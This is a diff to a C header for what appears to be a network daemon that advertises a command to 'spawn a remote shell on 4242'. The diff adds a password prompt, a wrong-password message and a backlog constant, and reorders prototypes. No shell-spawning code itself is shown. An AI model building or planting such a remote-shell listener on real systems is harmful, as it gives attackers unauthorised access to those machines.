@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <stdio.h>
+#include <strings.h>
 #include <sys/file.h>
 #include <sys/socket.h>
 #include <sys/epoll.h>
@@ -27,6 +28,10 @@
 			 "shell  spawn a remote shell on 4242\n"
 #define SHELL_MSG "spawning a shell...\n(press enter)\n"
 #define UNKNOWN_CMD_MSG  "unknown command\n"
+#define PASSWORD_PROMPT "password: "
+#define INVALID_PASSWORD_MSG "wrong\n(press enter)\n"
+
+#define BACKLOG 1024
 
 extern char **environ;
 
@@ -43,6 +48,9 @@ void	listen_server(void);
 void	exit_client(int epfd, int fd);
 
 // commands.c
-void	handle_command(int cfd, int epfd);
+void	handle_command(int epfd, int cfd);
 void	prompt(int fd);
-void	shell(int cfd, int epfd);
+
+// shell.c
+void	shell(int epfd, int cfd);
+void	shell_done(int);
